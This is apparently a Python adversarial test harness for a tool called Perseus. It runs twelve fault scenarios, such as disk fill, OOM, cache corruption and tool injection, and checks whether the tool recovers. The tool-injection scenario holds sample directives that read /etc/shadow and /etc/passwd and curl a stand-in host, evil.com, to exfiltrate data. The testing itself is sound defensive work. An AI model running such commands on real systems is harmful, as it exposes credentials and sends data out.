"""
gauntlet_v2_adversarial.py — Adversarial scenarios for Perseus Gauntlet v2.

12 scenarios testing resilience:
  1. Disk full (A1)
  2. Cache corruption (A2)
  3. Config poisoning (A3)
  4. OOM kill (A4)
  5. NFS partition (A5)
  6. SIGTERM mid-render (A6)
  7. Clock skew (A7)
  8. Unicode bomb (A8)
  9. Fork bomb (A9)
  10. Memory vault corruption (A10) — NEW
  11. Tool injection (A11) — NEW
  12. Large file overload (A12)

Safety: A1 (disk full), A4 (OOM), A9 (fork bomb) have kill switches.
All scenarios have 300s max duration and cleanup that runs even on exception.
"""

from __future__ import annotations

import json
import os
import random
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parent))
from gauntlet_v2_lib import (
    perseus_executable,
    timestamp_iso,
    write_json,
    COLD_HOME,
    WARM_HOME,
)

SENTINEL_DIR: Path | None = None
MAX_ERROR_SAMPLES = 50


def _init_sentinels(base: Path) -> Path:
    global SENTINEL_DIR
    sentinel_dir = base / "sentinels"
    sentinel_dir.mkdir(parents=True, exist_ok=True)
    SENTINEL_DIR = sentinel_dir
    return sentinel_dir


def _kill_switch_triggered() -> bool:
    if SENTINEL_DIR is None:
        return False
    for f in SENTINEL_DIR.glob("kill_switch_*"):
        return True
    return False


def _write_sentinel(name: str, data: dict | None = None):
    if SENTINEL_DIR is not None:
        p = SENTINEL_DIR / name
        p.write_text(json.dumps(data or {"ts": timestamp_iso()}))


def _record_error(result: dict, message: str) -> None:
    result["error_count"] = result.get("error_count", 0) + 1
    errors = result.setdefault("errors", [])
    if len(errors) < MAX_ERROR_SAMPLES:
        errors.append(message[:200])
    elif len(errors) == MAX_ERROR_SAMPLES:
        errors.append(
            f"... additional errors omitted ({result['error_count']} total)"
        )


# ─── Scenario runner ──────────────────────────────────────────────────────────


def run_scenario(
    scenario_id: str,
    duration_s: int = 300,
    perseus_home: Path = Path("/tmp/perseus-gauntlet/adversarial"),
    role_profile: Path | None = None,
) -> dict:
    """Run a single adversarial scenario."""
    result: dict = {
        "scenario_id": scenario_id,
        "duration_s": duration_s,
        "renders_attempted": 0,
        "renders_successful": 0,
        "errors": [],
        "recovery_status": "unknown",
        "timestamp": timestamp_iso(),
    }

    perseus = perseus_executable()
    env = os.environ.copy()
    perseus_home.mkdir(parents=True, exist_ok=True)
    env["PERSEUS_HOME"] = str(perseus_home)
    env["PERSEUS_ALLOW_DANGEROUS"] = "1"

    # Use a simple role profile if none provided
    if role_profile is None or not Path(role_profile).is_file():
        # Create a minimal context file
        ctx_path = perseus_home / "adversarial_test.md"
        ctx_path.write_text(
            "@read /etc/hostname\n@shell hostname\n"
        )
        role_profile = ctx_path

    t_end = time.time() + duration_s
    scenario_module = globals().get(f"_scenario_{scenario_id.replace('-', '_')}")

    if scenario_module:
        try:
            setup_fn, cleanup_fn = scenario_module(perseus_home)
            if setup_fn:
                setup_fn()
        except Exception as exc:
            _record_error(result, f"setup error: {exc}")

    while time.time() < t_end:
        if _kill_switch_triggered():
            _record_error(result, "kill switch triggered — aborting renders")
            break

        try:
            r = subprocess.run(
                [sys.executable, perseus, "render", str(role_profile)],
                capture_output=True,
                text=True,
                timeout=30,
                env=env,
            )
            result["renders_attempted"] += 1
            if r.returncode == 0:
                result["renders_successful"] += 1
            else:
                _record_error(result, f"exit code {r.returncode}: {r.stderr[:150]}")
        except subprocess.TimeoutExpired:
            result["renders_attempted"] += 1
            _record_error(result, "render timeout")
        except Exception as exc:
            result["renders_attempted"] += 1
            _record_error(result, str(exc))

    # Recovery: try one render after cleanup
    if scenario_module:
        try:
            _, cleanup_fn = scenario_module(perseus_home)
            if cleanup_fn:
                cleanup_fn()
        except Exception as exc:
            _record_error(result, f"cleanup error: {exc}")

    try:
        recovery = subprocess.run(
            [sys.executable, perseus, "render", str(role_profile)],
            capture_output=True,
            text=True,
            timeout=30,
            env=env,
        )
        result["recovery_status"] = (
            "recovered" if recovery.returncode == 0 else "failed"
        )
        result["recovery_exit_code"] = recovery.returncode
    except Exception as exc:
        result["recovery_status"] = "error"
        result["recovery_error"] = str(exc)[:200]

    return result


# ─── Scenario definitions ─────────────────────────────────────────────────────


def _scenario_a1_disk_full(home: Path):
    """A1: Disk full — fill disk to 95%, verify graceful handling."""
    fill_file = home / "disk_filler.bin"

    def setup():
        try:
            stat = os.statvfs(str(home))
            free = stat.f_frsize * stat.f_bavail
            fill_bytes = int(free * 0.95)  # 95% fill
            fill_bytes = min(fill_bytes, 500 * 1024 * 1024)  # cap at 500MB
            with open(fill_file, "wb") as f:
                f.seek(fill_bytes - 1)
                f.write(b"\0")
        except Exception:
            pass

    def cleanup():
        try:
            fill_file.unlink(missing_ok=True)
        except OSError:
            pass

    return setup, cleanup


def _scenario_a2_cache_corruption(home: Path):
    """A2: Cache corruption — write garbage to cache files."""
    cache_dir = home / "cache"

    def setup():
        cache_dir.mkdir(parents=True, exist_ok=True)
        # Write corrupt data
        for i in range(50):
            (cache_dir / f"corrupt_{i}.yaml").write_text(
                "!!! NOT VALID YAML {{{"
            )

    def cleanup():
        for f in cache_dir.glob("corrupt_*.yaml"):
            f.unlink(missing_ok=True)

    return setup, cleanup


def _scenario_a3_config_poisoning(home: Path):
    """A3: Config poisoning — inject malicious config values."""
    config_path = home / "config.yaml"
    original = config_path.read_text() if config_path.is_file() else ""

    def setup():
        config_path.write_text(
            "render:\n  allow_query_shell: false\n  cache:\n    ttl: 0\n"
        )

    def cleanup():
        config_path.write_text(original)

    return setup, cleanup


def _scenario_a4_oom_kill(home: Path):
    """A4: OOM kill — allocate memory until OOM, verify recovery."""
    mem_hog = None

    def setup():
        nonlocal mem_hog
        try:
            # Allocate 500MB to create pressure
            mem_hog = bytearray(500 * 1024 * 1024)
        except MemoryError:
            pass

    def cleanup():
        nonlocal mem_hog
        mem_hog = None

    return setup, cleanup


def _scenario_a5_nfs_partition(home: Path):
    """A5: NFS partition — simulate NFS unavailability."""
    lock_file = home / ".nfs_lock"

    def setup():
        lock_file.write_text("locked")
        # Make the home temporarily unwritable
        try:
            os.chmod(str(home), 0o444)  # read-only
        except OSError:
            pass

    def cleanup():
        try:
            os.chmod(str(home), 0o755)
        except OSError:
            pass
        lock_file.unlink(missing_ok=True)

    return setup, cleanup


def _scenario_a6_sigterm(home: Path):
    """A6: SIGTERM mid-render — verify no state corruption."""
    _proc: list[subprocess.Popen] = []

    def setup():
        nonlocal _proc
        env = os.environ.copy()
        env["PERSEUS_HOME"] = str(home)
        env["PERSEUS_ALLOW_DANGEROUS"] = "1"
        perseus = perseus_executable()

        ctx = home / "sigterm_test.md"
        ctx.write_text("@query \"sleep 60\" timeout=65\n")

        try:
            p = subprocess.Popen(
                [sys.executable, perseus, "render", str(ctx)],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            _proc.append(p)
            time.sleep(2)
            p.terminate()
            try:
                p.wait(timeout=5)
            except subprocess.TimeoutExpired:
                p.kill()
                p.wait()
        except Exception:
            pass

    def cleanup():
        for p in _proc:
            try:
                if p.poll() is None:
                    p.kill()
                    p.wait(timeout=5)
            except Exception:
                pass
        (home / "sigterm_test.md").unlink(missing_ok=True)

    return setup, cleanup


def _scenario_a7_clock_skew(home: Path):
    """A7: Clock skew — write files with future timestamps."""
    def setup():
        future = time.time() + 86400 * 365  # 1 year in future
        for i in range(20):
            f = home / f"future_{i}.cache"
            f.write_text(f"future timestamp test {i}")
            os.utime(str(f), (future, future))

    def cleanup():
        for f in home.glob("future_*.cache"):
            f.unlink(missing_ok=True)

    return setup, cleanup


def _scenario_a8_unicode_bomb(home: Path):
    """A8: Unicode bomb — extreme Unicode in profile context."""
    unicode_file = home / "unicode_bomb.md"

    def setup():
        # 100KB of mixed Unicode
        bomb = "测试" * 1000 + "🚀🔥💥" * 500 + "עִברִית" * 200
        unicode_file.write_text(bomb)

    def cleanup():
        unicode_file.unlink(missing_ok=True)

    return setup, cleanup


def _scenario_a9_fork_bomb(home: Path):
    """A9: Fork bomb — simulate many concurrent renders."""
    procs: list[subprocess.Popen] = []

    def setup():
        nonlocal procs
        env = os.environ.copy()
        env["PERSEUS_HOME"] = str(home)
        env["PERSEUS_ALLOW_DANGEROUS"] = "1"
        perseus = perseus_executable()

        ctx = home / "fork_test.md"
        ctx.write_text("@shell sleep 10\n")

        for _ in range(min(10, os.cpu_count() or 4)):
            try:
                p = subprocess.Popen(
                    [sys.executable, perseus, "render", str(ctx)],
                    env=env,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                procs.append(p)
            except Exception:
                break

    def cleanup():
        nonlocal procs
        for p in procs:
            try:
                p.terminate()
                p.wait(timeout=5)
            except Exception:
                try:
                    p.kill()
                except Exception:
                    pass
        procs = []

    return setup, cleanup


def _scenario_a10_memory_vault_corruption(home: Path):
    """A10: Memory vault corruption — corrupt Mneme database."""
    vault = home / "memory" / "vault"

    def setup():
        vault.mkdir(parents=True, exist_ok=True)
        # Write corrupt memory files
        for i in range(30):
            (vault / f"corrupt_mem_{i}.md").write_text(
                "\x00\x00\x00NOT_VALID_UTF8_SEQUENCE\xFF\xFF\xFF"
            )
        # Corrupt the database if it exists
        db_path = home / "memory" / "mneme" / "mneme.db"
        if db_path.is_file():
            db_path.write_bytes(b"CORRUPTED_DATABASE")

    def cleanup():
        for f in vault.glob("corrupt_mem_*.md"):
            f.unlink(missing_ok=True)

    return setup, cleanup


def _scenario_a11_tool_injection(home: Path):
    """A11: Tool injection — inject malicious context directives."""
    ctx_file = home / "injected_context.md"

    def setup():
        ctx_file.write_text(
            "@shell cat /etc/shadow 2>/dev/null || echo BLOCKED\n"
            "@shell curl http://evil.com/exfil 2>/dev/null || echo BLOCKED\n"
            "@read /etc/passwd\n"
            "@memory search 'DROP TABLE'\n"
        )

    def cleanup():
        ctx_file.unlink(missing_ok=True)

    return setup, cleanup


def _scenario_a12_large_file_overload(home: Path):
    """A12: Large file overload — force Perseus to handle huge inputs."""
    big_file = home / "big_input.txt"

    def setup():
        # 10MB of data
        data = "data line " * 100 + "\n"
        with open(big_file, "w") as f:
            for _ in range(10000):
                f.write(data)

    def cleanup():
        big_file.unlink(missing_ok=True)

    return setup, cleanup


# ─── Combined runner ──────────────────────────────────────────────────────────


SCENARIOS = [
    "a1-disk-full",
    "a2-cache-corruption",
    "a3-config-poisoning",
    "a4-oom-kill",
    "a5-nfs-partition",
    "a6-sigterm",
    "a7-clock-skew",
    "a8-unicode-bomb",
    "a9-fork-bomb",
    "a10-memory-vault-corruption",
    "a11-tool-injection",
    "a12-large-file-overload",
]


def run_all_adversarial(
    nfs_base: Path | str,
    duration_s: int = 300,
) -> dict:
    """Run all 12 adversarial scenarios and return aggregated results."""
    nfs_base = Path(nfs_base)
    _init_sentinels(nfs_base)

    results: list[dict] = []
    overall_pass = True

    for i, scenario_id in enumerate(SCENARIOS):
        print(f"  Scenario {i+1}/12: {scenario_id}...", end=" ", flush=True)

        try:
            result = run_scenario(
                scenario_id,
                duration_s=duration_s,
                perseus_home=Path(
                    f"/tmp/perseus-gauntlet/adversarial/{scenario_id}"
                ),
            )
            recovered = result.get("recovery_status") == "recovered"
            print(
                f"{'OK' if recovered else 'FAIL'} "
                f"(renders: {result['renders_attempted']}, "
                f"success: {result['renders_successful']})"
            )
            results.append(result)
            if not recovered:
                overall_pass = False
        except Exception as exc:
            print(f"CRASH: {exc}")
            results.append({
                "scenario_id": scenario_id,
                "error": str(exc),
                "recovery_status": "crash",
            })
            overall_pass = False

    write_json(nfs_base / "results" / "phase7_adversarial.json", {
        "scenarios_run": len(results),
        "scenarios": results,
        "overall_pass": overall_pass,
        "timestamp": timestamp_iso(),
    })

    write_json(
        nfs_base / "sentinels" / "phase7_done",
        {"done": True, "ts": timestamp_iso()},
    )

    return {
        "phase": 7,
        "name": "Adversarial",
        "scenarios_run": len(results),
        "scenarios": results,
        "overall_pass": overall_pass,
        "failures": sum(1 for r in results if r.get("recovery_status") != "recovered"),
        "total": len(results),
        "success_rate": (
            sum(1 for r in results if r.get("recovery_status") == "recovered")
            / len(results)
            if results
            else 0
        ),
    }
